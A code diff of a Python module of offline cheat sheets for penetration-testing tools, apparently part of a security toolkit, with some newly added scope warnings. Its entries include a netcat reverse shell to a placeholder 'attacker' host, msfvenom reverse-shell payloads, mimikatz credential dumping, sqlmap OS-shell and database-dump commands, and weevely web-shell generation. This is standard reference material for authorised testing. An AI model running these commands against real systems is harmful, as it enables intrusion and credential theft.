@@ -1,420 +1,341 @@
-"""Offline cheat sheets for all one-click tools.
+"""Offline cheat sheets, one per tool in the catalog.
 
-Each cheat sheet is a dict with title and sections (heading + markdown content).
-All content is static Python data — no network calls.
+``tests/test_cheat_sheets.py`` keeps this in step with ``catalog/tools.yaml``: every tool
+that is not a built-in feature has a sheet, and every sheet belongs to a catalog tool.
+All content is static data; there are no network calls.
 """
 
 from __future__ import annotations
 
 from typing import Any
 
-#: Cheat sheets for all one-click tools in the catalog.
 #: tool_id -> {title, sections: [{heading, content_md}]}
-CHEAT_SHEETS: dict[str, dict[str, Any]] = {
-    "nmap": {
-        "title": "Nmap — Network Mapper",
-        "sections": [
-            {
-                "heading": "Basic Scan",
-                "content_md": ("nmap -sV -sC <target>\n# Version detection + default scripts"),
-            },
-            {
-                "heading": "Stealth Scan",
-                "content_md": ("nmap -sS -T4 <target>\n# SYN scan, faster timing"),
-            },
-            {
-                "heading": "All Ports",
-                "content_md": ("nmap -p- <target>\n# Scan all 65535 ports"),
-            },
-            {
-                "heading": "UDP Scan",
-                "content_md": ("nmap -sU --top-ports 100 <target>\n# Top 100 UDP ports"),
-            },
-        ],
-    },
-    "sqlmap": {
-        "title": "SQLMap — SQL Injection",
-        "sections": [
-            {
-                "heading": "Basic Injection Test",
-                "content_md": (
-                    'sqlmap -u "http://target/page?id=1" --batch\n# Auto-detect injection point'
-                ),
-            },
-            {
-                "heading": "Dump Database",
-                "content_md": ('sqlmap -u "URL" -D dbname --dump --batch\n# Dump entire database'),
-            },
-            {
-                "heading": "OS Shell",
-                "content_md": ('sqlmap -u "URL" --os-shell\n# Requires write access + UNION'),
-            },
-            {
-                "heading": "Tamper Scripts",
-                "content_md": ('sqlmap -u "URL" --tamper=space2comment,between\n# Bypass WAFs'),
-            },
-        ],
-    },
-    "nikto": {
-        "title": "Nikto — Web Scanner",
-        "sections": [
-            {"heading": "Basic Scan", "content_md": "nikto -h http://target\n# Default checks"},
-            {"heading": "SSL Scan", "content_md": "nikto -h https://target -ssl\n# HTTPS target"},
-            {
-                "heading": "Specific Port",
-                "content_md": "nikto -h http://target -p 8080\n# Custom port",
-            },
-        ],
-    },
-    "whatweb": {
-        "title": "WhatWeb — Web Fingerprinter",
-        "sections": [
-            {
-                "heading": "Basic Fingerprint",
-                "content_md": "whatweb http://target\n# Identify CMS, frameworks",
-            },
-            {"heading": "Verbose", "content_md": "whatweb -v http://target\n# More detail"},
-        ],
-    },
-    "dnsrecon": {
-        "title": "DNSRecon — DNS Enumeration",
-        "sections": [
-            {
-                "heading": "Standard Enumeration",
-                "content_md": "dnsrecon -d example.com\n# AXFR, NSEC3, etc.",
-            },
-            {
-                "heading": "Brute Force",
-                "content_md": (
-                    "dnsrecon -d example.com -D wordlists/dnsmap.txt -t brt\n"
-                    "# Subdomain brute force"
-                ),
-            },
-        ],
-    },
-    "theharvester": {
-        "title": "theHarvester — OSINT",
-        "sections": [
-            {
-                "heading": "Email Harvest",
-                "content_md": "theHarvester -d example.com -b google,linkedin",
-            },
-            {"heading": "All Sources", "content_md": "theHarvester -d example.com -b all"},
-        ],
-    },
-    "amass": {
-        "title": "Amass — Attack Surface Mapping",
-        "sections": [
-            {"heading": "Subdomain Enumeration", "content_md": "amass enum -d example.com"},
-            {"heading": "Intel Mode", "content_md": "amass intel -d example.com"},
-        ],
-    },
-    "nuclei": {
-        "title": "Nuclei — Template Scanner",
-        "sections": [
-            {"heading": "Basic Scan", "content_md": "nuclei -u http://target\n# Run all templates"},
-            {
-                "heading": "Specific Severity",
-                "content_md": "nuclei -u http://target -s critical,high",
-            },
-            {
-                "heading": "Custom Templates",
-                "content_md": "nuclei -u http://target -t ~/custom-templates/",
-            },
-        ],
-    },
-    "testssl": {
-        "title": "testssl.sh — SSL/TLS Scanner",
-        "sections": [
-            {
-                "heading": "Basic Scan",
-                "content_md": "testssl.sh target:443\n# Full SSL/TLS analysis",
-            },
-            {"heading": "Quick Scan", "content_md": "testssl.sh --fast target:443"},
-        ],
-    },
-    "sslscan": {
-        "title": "SSLScan — SSL/TLS Scanner",
-        "sections": [
-            {
-                "heading": "Basic Scan",
-                "content_md": "sslscan target:443\n# Cipher suites + cert info",
-            },
-        ],
-    },
-    "john": {
-        "title": "John the Ripper — Password Cracker",
-        "sections": [
-            {
-                "heading": "Auto Mode",
-                "content_md": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
-            },
-            {
-                "heading": "Specific Format",
-                "content_md": "john --format=raw-md5 --wordlist=wordlist.txt hashes.txt",
-            },
-            {"heading": "Show Cracked", "content_md": "john --show hashes.txt"},
-        ],
-    },
-    "hashcat": {
-        "title": "Hashcat — GPU Password Cracker",
-        "sections": [
-            {"heading": "MD5 Crack", "content_md": "hashcat -m 0 -a 0 hashes.txt wordlist.txt"},
-            {"heading": "NTLM Crack", "content_md": "hashcat -m 1000 -a 0 hashes.txt wordlist.txt"},
-            {
-                "heading": "Mask Attack",
-                "content_md": "hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d",
-            },
-            {"heading": "Show Cracked", "content_md": "hashcat --show -m 0 hashes.txt"},
-        ],
-    },
-    "hydra": {
-        "title": "Hydra — Online Brute Forcer",
-        "sections": [
-            {"heading": "SSH Brute", "content_md": "hydra -l admin -P wordlist.txt ssh://target"},
-            {
-                "heading": "HTTP Form",
-                "content_md": (
-                    "hydra -L users.txt -P wordlist.txt target "
-                    'http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"'
-                ),
-            },
-        ],
-    },
-    "medusa": {
-        "title": "Medusa — Parallel Brute Forcer",
-        "sections": [
-            {
-                "heading": "SSH Brute",
-                "content_md": "medusa -h target -u admin -P wordlist.txt -M ssh",
-            },
-        ],
-    },
-    "cewl": {
-        "title": "CeWL — Custom Wordlist Generator",
-        "sections": [
-            {
-                "heading": "Basic Crawl",
-                "content_md": "cewl -d 2 -m 6 -w wordlist.txt http://target",
-            },
-        ],
-    },
-    "crunch": {
-        "title": "Crunch — Wordlist Generator",
-        "sections": [
-            {
-                "heading": "Numeric Mask",
-                "content_md": "crunch 4 4 0123456789\n# All 4-digit combos",
-            },
-            {
-                "heading": "Pattern Mask",
-                "content_md": "crunch 8 8 -t pass@@@@\n# pass + 4 lowercase",
-            },
-        ],
-    },
-    "gobuster": {
-        "title": "Gobuster — Directory/DNS Bruteforcer",
-        "sections": [
-            {
-                "heading": "Dir Mode",
-                "content_md": (
-                    "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt"
-                ),
-            },
-            {"heading": "DNS Mode", "content_md": "gobuster dns -d example.com -w subdomains.txt"},
-        ],
-    },
-    "ffuf": {
-        "title": "FFuF — Fuzz Faster U Fool",
-        "sections": [
-            {
-                "heading": "Directory Fuzz",
-                "content_md": "ffuf -w wordlist.txt -u http://target/FUZZ",
-            },
-            {
-                "heading": "Vhost Fuzz",
-                "content_md": 'ffuf -w vhosts.txt -u http://target -H "Host: FUZZ.target"',
-            },
-        ],
-    },
-    "dirb": {
-        "title": "Dirb — Web Content Scanner",
-        "sections": [
-            {"heading": "Basic Scan", "content_md": "dirb http://target"},
-            {
-                "heading": "Custom Wordlist",
-                "content_md": "dirb http://target /usr/share/wordlists/dirb/big.txt",
-            },
-        ],
-    },
-    "wpscan": {
-        "title": "WPScan — WordPress Scanner",
-        "sections": [
-            {"heading": "Basic Scan", "content_md": "wpscan --url http://target/wp"},
-            {
-                "heading": "API Token",
-                "content_md": "wpscan --url http://target/wp --api-token YOUR_TOKEN",
-            },
-        ],
-    },
-    "aircrack-ng": {
-        "title": "Aircrack-ng — WiFi Cracker",
-        "sections": [
-            {
-                "heading": "Capture Handshake",
-                "content_md": "airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture",
-            },
-            {"heading": "Crack WPA", "content_md": "aircrack-ng -w wordlist.txt capture-01.cap"},
-        ],
-    },
-    "reaver": {
-        "title": "Reaver — WPS Cracker",
-        "sections": [
-            {"heading": "WPS Attack", "content_md": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv"},
-        ],
-    },
-    "wifite": {
-        "title": "Wifite — Automated WiFi Auditor",
-        "sections": [
-            {"heading": "Auto Attack", "content_md": "wifite --wps\n# Automated WPS + WPA attacks"},
-        ],
-    },
-    "mimikatz": {
-        "title": "Mimikatz — Credential Dumper",
-        "sections": [
-            {
-                "heading": "Dump Credentials",
-                "content_md": "mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords",
-            },
-        ],
-    },
-    "empire": {
-        "title": "Empire — Post-Exploitation Framework",
-        "sections": [
-            {
-                "heading": "Start Listener",
-                "content_md": "usestager windows/launcher_bat\nset Listener http\nexecute",
-            },
-        ],
-    },
-    "meterpreter": {
-        "title": "Meterpreter — Metasploit Shell",
-        "sections": [
-            {
-                "heading": "Basic Commands",
-                "content_md": "meterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > shell",
-            },
-        ],
-    },
-    "volatility": {
-        "title": "Volatility3 — Memory Forensics",
-        "sections": [
-            {"heading": "Image Info", "content_md": "vol -f memory.dump windows.info"},
-            {"heading": "Process List", "content_md": "vol -f memory.dump windows.pslist"},
-            {
-                "heading": "Dump Files",
-                "content_md": "vol -f memory.dump windows.filescan | grep <pattern>",
-            },
-        ],
-    },
-    "sleuthkit": {
-        "title": "SleuthKit — Disk Forensics",
-        "sections": [
-            {"heading": "File System Info", "content_md": "fsstat disk.img"},
-            {"heading": "List Files", "content_md": "fls -r disk.img"},
-            {"heading": "Recover File", "content_md": "icat disk.img <inode> > recovered_file"},
-        ],
-    },
-    "foremost": {
-        "title": "Foremost — File Carver",
-        "sections": [
-            {"heading": "Basic Carve", "content_md": "foremost -i disk.img -o output/"},
-            {
-                "heading": "Specific Types",
-                "content_md": "foremost -t jpg,pdf,doc -i disk.img -o output/",
-            },
-        ],
-    },
-    "binwalk": {
-        "title": "Binwalk — Firmware Analyzer",
-        "sections": [
-            {"heading": "Analyze Firmware", "content_md": "binwalk firmware.bin"},
-            {"heading": "Extract", "content_md": "binwalk -e firmware.bin"},
-        ],
-    },
-    "exiftool": {
-        "title": "ExifTool — Metadata Viewer",
-        "sections": [
-            {"heading": "View Metadata", "content_md": "exiftool image.jpg"},
-            {"heading": "Strip Metadata", "content_md": "exiftool -all= image.jpg"},
-        ],
-    },
-    "tcpdump": {
-        "title": "tcpdump — Packet Capture",
-        "sections": [
-            {"heading": "Basic Capture", "content_md": "tcpdump -i eth0 -w capture.pcap"},
-            {"heading": "Filter by Port", "content_md": "tcpdump -i eth0 port 80"},
-            {"heading": "Filter by Host", "content_md": "tcpdump -i eth0 host 192.168.1.100"},
-        ],
-    },
-    "tshark": {
-        "title": "TShark — Wireshark CLI",
-        "sections": [
-            {"heading": "Basic Capture", "content_md": "tshark -i eth0 -w capture.pcap"},
-            {"heading": "Read PCAP", "content_md": 'tshark -r capture.pcap -Y "http"'},
-            {"heading": "Statistics", "content_md": "tshark -r capture.pcap -q -z io,stat,1"},
-        ],
-    },
-    "wireshark": {
-        "title": "Wireshark — Packet Analyzer",
-        "sections": [
-            {"heading": "GUI Launch", "content_md": "wireshark -i eth0"},
-            {"heading": "Read PCAP", "content_md": "wireshark capture.pcap"},
-        ],
-    },
-    "searchsploit": {
-        "title": "SearchSploit — Exploit Database",
-        "sections": [
-            {"heading": "Search Exploits", "content_md": "searchsploit apache 2.4.49"},
-            {"heading": "Copy Exploit", "content_md": "searchsploit -m 50000"},
-        ],
-    },
-    "netcat": {
-        "title": "Netcat — Swiss Army Knife",
-        "sections": [
-            {"heading": "Reverse Shell", "content_md": "nc -e /bin/bash attacker 4444"},
-            {"heading": "Listen", "content_md": "nc -lvnp 4444"},
-            {"heading": "Port Scan", "content_md": "nc -zv target 1-1000"},
-        ],
-    },
-    "socat": {
-        "title": "socat — Socket Cat",
-        "sections": [
-            {"heading": "Port Forward", "content_md": "socat TCP-LISTEN:8080,fork TCP:target:80"},
-        ],
-    },
-    "burp": {
-        "title": "Burp Suite — Web Proxy",
-        "sections": [
-            {"heading": "Launch", "content_md": "burpsuite"},
-        ],
-    },
-}
+CHEAT_SHEETS: dict[str, dict[str, Any]] = {'aircrack-ng': {'title': 'Aircrack-ng — WiFi Cracker',
+                 'sections': [{'heading': 'Capture Handshake',
+                               'content_md': 'airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c '
+                                             '6 -w capture'},
+                              {'heading': 'Crack WPA',
+                               'content_md': 'aircrack-ng -w wordlist.txt capture-01.cap'}]},
+ 'bettercap': {'title': 'bettercap - Network Recon',
+               'sections': [{'heading': 'Start on an interface',
+                             'content_md': 'bettercap -iface eth0'},
+                            {'heading': 'Discover hosts (inside the console)',
+                             'content_md': 'net.probe on\nnet.show'},
+                            {'heading': 'Note',
+                             'content_md': 'Wi-Fi and Bluetooth modules need hardware WSL2 '
+                                           'cannot reach.'}]},
+ 'binwalk': {'title': 'Binwalk — Firmware Analyzer',
+             'sections': [{'heading': 'Analyze Firmware', 'content_md': 'binwalk firmware.bin'},
+                          {'heading': 'Extract', 'content_md': 'binwalk -e firmware.bin'}]},
+ 'cewl': {'title': 'CeWL — Custom Wordlist Generator',
+          'sections': [{'heading': 'Basic Crawl',
+                        'content_md': 'cewl -d 2 -m 6 -w wordlist.txt http://target'}]},
+ 'commix': {'title': 'commix - Command Injection',
+            'sections': [{'heading': 'Test a parameter',
+                          'content_md': "commix --url='http://target/page?host=127.0.0.1' "
+                                        '--batch'},
+                         {'heading': 'POST data',
+                          'content_md': "commix --url='http://target/page' "
+                                        "--data='host=127.0.0.1' --batch"},
+                         {'heading': 'Only on systems you may test',
+                          'content_md': 'commix runs commands on the target when it succeeds.'}]},
+ 'crunch': {'title': 'Crunch — Wordlist Generator',
+            'sections': [{'heading': 'Numeric Mask',
+                          'content_md': 'crunch 4 4 0123456789\n# All 4-digit combos'},
+                         {'heading': 'Pattern Mask',
+                          'content_md': 'crunch 8 8 -t pass@@@@\n# pass + 4 lowercase'}]},
+ 'dns': {'title': 'dig - DNS Lookup',
+         'sections': [{'heading': 'Look up a name', 'content_md': 'dig +short example.com'},
+                      {'heading': 'A specific record type',
+                       'content_md': 'dig +short MX example.com\n'
+                                     'dig +short TXT example.com\n'
+                                     'dig +short NS example.com'},
+                      {'heading': 'Ask a specific server',
+                       'content_md': 'dig @1.1.1.1 example.com'},
+                      {'heading': 'Reverse lookup', 'content_md': 'dig -x 8.8.8.8 +short'},
+                      {'heading': 'Zone transfer attempt (your own zones only)',
+                       'content_md': 'dig axfr example.com @ns1.example.com'}]},
+ 'dnsrecon': {'title': 'DNSRecon — DNS Enumeration',
+              'sections': [{'heading': 'Standard Enumeration',
+                            'content_md': 'dnsrecon -d example.com\n# AXFR, NSEC3, etc.'},
+                           {'heading': 'Brute Force',
+                            'content_md': 'dnsrecon -d example.com -D wordlists/dnsmap.txt -t '
+                                          'brt\n'
+                                          '# Subdomain brute force'}]},
+ 'exiftool': {'title': 'ExifTool — Metadata Viewer',
+              'sections': [{'heading': 'View Metadata', 'content_md': 'exiftool image.jpg'},
+                           {'heading': 'Strip Metadata',
+                            'content_md': 'exiftool -all= image.jpg'}]},
+ 'ffuf': {'title': 'FFuF — Fuzz Faster U Fool',
+          'sections': [{'heading': 'Directory Fuzz',
+                        'content_md': 'ffuf -w wordlist.txt -u http://target/FUZZ'},
+                       {'heading': 'Vhost Fuzz',
+                        'content_md': 'ffuf -w vhosts.txt -u http://target -H "Host: '
+                                      'FUZZ.target"'}]},
+ 'foremost': {'title': 'Foremost — File Carver',
+              'sections': [{'heading': 'Basic Carve',
+                            'content_md': 'foremost -i disk.img -o output/'},
+                           {'heading': 'Specific Types',
+                            'content_md': 'foremost -t jpg,pdf,doc -i disk.img -o output/'}]},
+ 'gdb': {'title': 'gdb - Debugger',
+         'sections': [{'heading': 'Run and print a backtrace',
+                       'content_md': 'gdb -q -batch -ex run -ex bt ./program'},
+                      {'heading': 'Interactive',
+                       'content_md': 'gdb ./program\nbreak main\nrun\nnext\ninfo registers'},
+                      {'heading': 'Careful',
+                       'content_md': 'This runs the program. Only debug software you trust or in '
+                                     'a disposable runtime.'}]},
+ 'gobuster': {'title': 'Gobuster — Directory/DNS Bruteforcer',
+              'sections': [{'heading': 'Dir Mode',
+                            'content_md': 'gobuster dir -u http://target -w '
+                                          '/usr/share/wordlists/dirb/common.txt'},
+                           {'heading': 'DNS Mode',
+                            'content_md': 'gobuster dns -d example.com -w subdomains.txt'}]},
+ 'hashcat': {'title': 'Hashcat — GPU Password Cracker',
+             'sections': [{'heading': 'MD5 Crack',
+                           'content_md': 'hashcat -m 0 -a 0 hashes.txt wordlist.txt'},
+                          {'heading': 'NTLM Crack',
+                           'content_md': 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt'},
+                          {'heading': 'Mask Attack',
+                           'content_md': 'hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d'},
+                          {'heading': 'Show Cracked',
+                           'content_md': 'hashcat --show -m 0 hashes.txt'}]},
+ 'hcxtools': {'title': 'hcxtools - Wi-Fi Capture Conversion',
+              'sections': [{'heading': 'Convert a capture for hashcat',
+                            'content_md': 'hcxpcapngtool -o out.hc22000 capture.pcapng'},
+                           {'heading': 'Then crack with hashcat',
+                            'content_md': 'hashcat -m 22000 out.hc22000 '
+                                          '/usr/share/wordlists/rockyou.txt'},
+                           {'heading': 'Inspect a capture',
+                            'content_md': 'hcxpcapngtool capture.pcapng'}]},
+ 'hydra': {'title': 'Hydra — Online Brute Forcer',
+           'sections': [{'heading': 'SSH Brute',
+                         'content_md': 'hydra -l admin -P wordlist.txt ssh://target'},
+                        {'heading': 'HTTP Form',
+                         'content_md': 'hydra -L users.txt -P wordlist.txt target http-post-form '
+                                       '"/login:user=^USER^&pass=^PASS^:F=incorrect"'}]},
+ 'john': {'title': 'John the Ripper — Password Cracker',
+          'sections': [{'heading': 'Auto Mode',
+                        'content_md': 'john --wordlist=/usr/share/wordlists/rockyou.txt '
+                                      'hashes.txt'},
+                       {'heading': 'Specific Format',
+                        'content_md': 'john --format=raw-md5 --wordlist=wordlist.txt hashes.txt'},
+                       {'heading': 'Show Cracked', 'content_md': 'john --show hashes.txt'}]},
+ 'lynis': {'title': 'Lynis - Security Audit',
+           'sections': [{'heading': 'Audit the runtime',
+                         'content_md': 'lynis audit system --quick --no-colors'},
+                        {'heading': 'Show the report',
+                         'content_md': 'less /var/log/lynis-report.dat'},
+                        {'heading': 'Scope',
+                         'content_md': 'It audits the Linux runtime, not your Windows PC.'}]},
+ 'masscan': {'title': 'masscan - Very Fast Port Scanner',
+             'sections': [{'heading': 'Scan a range (IPs, not host names)',
+                           'content_md': 'masscan 10.0.0.0/24 -p1-1000 --rate 500'},
+                          {'heading': 'Specific ports',
+                           'content_md': 'masscan 10.0.0.5 -p22,80,443 --rate 200'},
+                          {'heading': 'Save results',
+                           'content_md': 'masscan 10.0.0.0/24 -p80 --rate 500 -oL out.txt'},
+                          {'heading': 'Be gentle',
+                           'content_md': 'Keep --rate low on shared networks; masscan can flood '
+                                         'a link.'}]},
+ 'medusa': {'title': 'Medusa — Parallel Brute Forcer',
+            'sections': [{'heading': 'SSH Brute',
+                          'content_md': 'medusa -h target -u admin -P wordlist.txt -M ssh'}]},
+ 'metasploit': {'title': 'Metasploit Framework',
+                'sections': [{'heading': 'Start the console', 'content_md': 'msfconsole -q'},
+                             {'heading': 'Find a scanner',
+                              'content_md': 'search type:auxiliary scanner http'},
+                             {'heading': 'Run an auxiliary scanner',
+                              'content_md': 'use auxiliary/scanner/http/http_version\n'
+                                            'set RHOSTS 10.0.0.5\n'
+                                            'run'},
+                             {'heading': 'Database status', 'content_md': 'msfdb status'},
+                             {'heading': 'The one-click form',
+                              'content_md': 'Only auxiliary scanner/gather modules run from the '
+                                            'form; exploits run in a terminal.'}]},
+ 'msfvenom': {'title': 'msfvenom - Payload Generator',
+              'sections': [{'heading': 'List payloads',
+                            'content_md': 'msfvenom -l payloads | grep reverse_tcp'},
+                           {'heading': 'Linux reverse shell (ELF)',
+                            'content_md': 'msfvenom -p linux/x64/shell_reverse_tcp '
+                                          'LHOST=10.0.0.2 LPORT=4444 -f elf -o shell.elf'},
+                           {'heading': 'Windows reverse shell (EXE)',
+                            'content_md': 'msfvenom -p windows/x64/shell_reverse_tcp '
+                                          'LHOST=10.0.0.2 LPORT=4444 -f exe -o shell.exe'},
+                           {'heading': 'Matching listener',
+                            'content_md': "msfconsole -q -x 'use exploit/multi/handler; set "
+                                          'payload linux/x64/shell_reverse_tcp; set LHOST '
+                                          "10.0.0.2; set LPORT 4444; run'"}]},
+ 'netcat': {'title': 'Netcat — Swiss Army Knife',
+            'sections': [{'heading': 'Reverse Shell',
+                          'content_md': 'nc -e /bin/bash attacker 4444'},
+                         {'heading': 'Listen', 'content_md': 'nc -lvnp 4444'},
+                         {'heading': 'Port Scan', 'content_md': 'nc -zv target 1-1000'}]},
+ 'nikto': {'title': 'Nikto — Web Scanner',
+           'sections': [{'heading': 'Basic Scan',
+                         'content_md': 'nikto -h http://target\n# Default checks'},
+                        {'heading': 'SSL Scan',
+                         'content_md': 'nikto -h https://target -ssl\n# HTTPS target'},
+                        {'heading': 'Specific Port',
+                         'content_md': 'nikto -h http://target -p 8080\n# Custom port'}]},
+ 'nmap': {'title': 'Nmap — Network Mapper',
+          'sections': [{'heading': 'Basic Scan',
+                        'content_md': 'nmap -sV -sC <target>\n'
+                                      '# Version detection + default scripts'},
+                       {'heading': 'Stealth Scan',
+                        'content_md': 'nmap -sS -T4 <target>\n# SYN scan, faster timing'},
+                       {'heading': 'All Ports',
+                        'content_md': 'nmap -p- <target>\n# Scan all 65535 ports'},
+                       {'heading': 'UDP Scan',
+                        'content_md': 'nmap -sU --top-ports 100 <target>\n# Top 100 UDP ports'}]},
+ 'nuclei': {'title': 'Nuclei — Template Scanner',
+            'sections': [{'heading': 'Basic Scan',
+                          'content_md': 'nuclei -u http://target\n# Run all templates'},
+                         {'heading': 'Specific Severity',
+                          'content_md': 'nuclei -u http://target -s critical,high'},
+                         {'heading': 'Custom Templates',
+                          'content_md': 'nuclei -u http://target -t ~/custom-templates/'}]},
+ 'photorec': {'title': 'PhotoRec - File Recovery',
+              'sections': [{'heading': 'Recover from an image (interactive)',
+                            'content_md': 'photorec disk.img'},
+                           {'heading': 'Non-interactive',
+                            'content_md': 'photorec /d recovered/ /cmd disk.img '
+                                          'partition_none,fileopt,everything,enable,search'},
+                           {'heading': 'Work on a copy',
+                            'content_md': 'Never run recovery tools on the only copy of the '
+                                          'evidence.'}]},
+ 'radare2': {'title': 'radare2 - Reverse Engineering',
+             'sections': [{'heading': 'Open and analyse', 'content_md': 'r2 -A ./binary'},
+                          {'heading': 'List functions', 'content_md': 'afl'},
+                          {'heading': 'Disassemble main', 'content_md': 'pdf @ main'},
+                          {'heading': 'Strings and imports', 'content_md': 'iz\nii'},
+                          {'heading': 'Quit', 'content_md': 'q'}]},
+ 'responder': {'title': 'Responder - LLMNR/NBT-NS Analysis',
+               'sections': [{'heading': 'Analyse only (nothing is poisoned)',
+                             'content_md': 'responder -I eth0 -A'},
+                            {'heading': 'Interfaces', 'content_md': 'ip -br addr'},
+                            {'heading': 'Note',
+                             'content_md': 'WSL2 sits behind NAT, so it sees little LAN '
+                                           'broadcast traffic; use a real Linux host for lab '
+                                           'work.'}]},
+ 'searchsploit': {'title': 'SearchSploit — Exploit Database',
+                  'sections': [{'heading': 'Search Exploits',
+                                'content_md': 'searchsploit apache 2.4.49'},
+                               {'heading': 'Copy Exploit',
+                                'content_md': 'searchsploit -m 50000'}]},
+ 'sleuthkit': {'title': 'SleuthKit — Disk Forensics',
+               'sections': [{'heading': 'File System Info', 'content_md': 'fsstat disk.img'},
+                            {'heading': 'List Files', 'content_md': 'fls -r disk.img'},
+                            {'heading': 'Recover File',
+                             'content_md': 'icat disk.img <inode> > recovered_file'}]},
+ 'socat': {'title': 'socat — Socket Cat',
+           'sections': [{'heading': 'Port Forward',
+                         'content_md': 'socat TCP-LISTEN:8080,fork TCP:target:80'}]},
+ 'sqlmap': {'title': 'SQLMap — SQL Injection',
+            'sections': [{'heading': 'Basic Injection Test',
+                          'content_md': 'sqlmap -u "http://target/page?id=1" --batch\n'
+                                        '# Auto-detect injection point'},
+                         {'heading': 'Dump Database',
+                          'content_md': 'sqlmap -u "URL" -D dbname --dump --batch\n'
+                                        '# Dump entire database'},
+                         {'heading': 'OS Shell',
+                          'content_md': 'sqlmap -u "URL" --os-shell\n'
+                                        '# Requires write access + UNION'},
+                         {'heading': 'Tamper Scripts',
+                          'content_md': 'sqlmap -u "URL" --tamper=space2comment,between\n'
+                                        '# Bypass WAFs'}]},
+ 'steghide': {'title': 'steghide - Steganography',
+              'sections': [{'heading': 'Extract hidden data',
+                            'content_md': "steghide extract -sf image.jpg -p '<passphrase>'"},
+                           {'heading': 'Show whether data is embedded',
+                            'content_md': 'steghide info image.jpg'},
+                           {'heading': 'Embed a file',
+                            'content_md': 'steghide embed -cf cover.jpg -ef secret.txt -p '
+                                          "'<passphrase>'"}]},
+ 'strace': {'title': 'strace - System Call Trace',
+            'sections': [{'heading': 'Network calls only',
+                          'content_md': 'strace -f -e trace=network ./program'},
+                         {'heading': 'File access',
+                          'content_md': 'strace -f -e trace=openat ./program'},
+                         {'heading': 'Write the trace to a file',
+                          'content_md': 'strace -f -o trace.txt ./program'},
+                         {'heading': 'Careful',
+                          'content_md': 'This runs the program. Only trace software you '
+                                        'trust.'}]},
+ 'tcpdump': {'title': 'tcpdump — Packet Capture',
+             'sections': [{'heading': 'Basic Capture',
+                           'content_md': 'tcpdump -i eth0 -w capture.pcap'},
+                          {'heading': 'Filter by Port', 'content_md': 'tcpdump -i eth0 port 80'},
+                          {'heading': 'Filter by Host',
+                           'content_md': 'tcpdump -i eth0 host 192.168.1.100'}]},
+ 'theharvester': {'title': 'theHarvester — OSINT',
+                  'sections': [{'heading': 'Email Harvest',
+                                'content_md': 'theHarvester -d example.com -b google,linkedin'},
+                               {'heading': 'All Sources',
+                                'content_md': 'theHarvester -d example.com -b all'}]},
+ 'tshark': {'title': 'TShark — Wireshark CLI',
+            'sections': [{'heading': 'Basic Capture',
+                          'content_md': 'tshark -i eth0 -w capture.pcap'},
+                         {'heading': 'Read PCAP',
+                          'content_md': 'tshark -r capture.pcap -Y "http"'},
+                         {'heading': 'Statistics',
+                          'content_md': 'tshark -r capture.pcap -q -z io,stat,1'}]},
+ 'volatility3': {'title': 'Volatility3 — Memory Forensics',
+                 'sections': [{'heading': 'Image Info',
+                               'content_md': 'vol -f memory.dump windows.info'},
+                              {'heading': 'Process List',
+                               'content_md': 'vol -f memory.dump windows.pslist'},
+                              {'heading': 'Dump Files',
+                               'content_md': 'vol -f memory.dump windows.filescan | grep '
+                                             '<pattern>'},
+                              {'heading': 'Network Connections',
+                               'content_md': 'vol -f memory.dump windows.netscan'},
+                              {'heading': 'Command Lines',
+                               'content_md': 'vol -f memory.dump windows.cmdline'},
+                              {'heading': 'Linux Images',
+                               'content_md': 'vol -f memory.lime linux.pslist\n'
+                                             'vol -f memory.lime linux.bash'}]},
+ 'wapiti': {'title': 'Wapiti - Web Vulnerability Scanner',
+            'sections': [{'heading': 'Basic scan',
+                          'content_md': 'wapiti -u http://target/ --flush-session'},
+                         {'heading': 'Only some modules',
+                          'content_md': 'wapiti -u http://target/ -m sql,xss'},
+                         {'heading': 'Save a report',
+                          'content_md': 'wapiti -u http://target/ -f html -o report/'}]},
+ 'weevely': {'title': 'weevely - PHP Web Shell',
+             'sections': [{'heading': 'Generate an agent',
+                           'content_md': 'weevely generate <password> agent.php'},
+                          {'heading': 'Connect to it',
+                           'content_md': 'weevely http://target/agent.php <password>'},
+                          {'heading': 'Use',
+                           'content_md': 'Only on your own test servers; upload and removal are '
+                                         'your job.'}]},
+ 'whatweb': {'title': 'WhatWeb — Web Fingerprinter',
+             'sections': [{'heading': 'Basic Fingerprint',
+                           'content_md': 'whatweb http://target\n# Identify CMS, frameworks'},
+                          {'heading': 'Verbose',
+                           'content_md': 'whatweb -v http://target\n# More detail'}]},
+ 'whois': {'title': 'whois - Domain and IP Ownership',
+           'sections': [{'heading': 'Domain', 'content_md': 'whois example.com'},
+                        {'heading': 'IP address', 'content_md': 'whois 8.8.8.8'},
+                        {'heading': 'Just the registrar and dates',
+                         'content_md': 'whois example.com | grep -iE '
+                                       "'registrar|creation|expir'"}]},
+ 'wifite': {'title': 'Wifite — Automated WiFi Auditor',
+            'sections': [{'heading': 'Auto Attack',
+                          'content_md': 'wifite --wps\n# Automated WPS + WPA attacks'}]},
+ 'wpscan': {'title': 'WPScan — WordPress Scanner',
+            'sections': [{'heading': 'Basic Scan', 'content_md': 'wpscan --url http://target/wp'},
+                         {'heading': 'API Token',
+                          'content_md': 'wpscan --url http://target/wp --api-token YOUR_TOKEN'}]}}
+
 
 
 def get_cheatsheet(tool_id: str) -> dict[str, Any] | None:
-    """Get a cheat sheet by tool_id.
-
-    Returns:
-        dict with title and sections, or None if not found.
-    """
+    """A cheat sheet by tool id, or None."""
     return CHEAT_SHEETS.get(tool_id)
 
 
 def list_cheatsheets() -> list[dict[str, Any]]:
-    """List all available cheat sheets (metadata only).
-
-    Returns:
-        List of {tool_id, title} dicts.
-    """
+    """Metadata for every sheet: [{tool_id, title}]."""
     return [{"tool_id": tool_id, "title": data["title"]} for tool_id, data in CHEAT_SHEETS.items()]
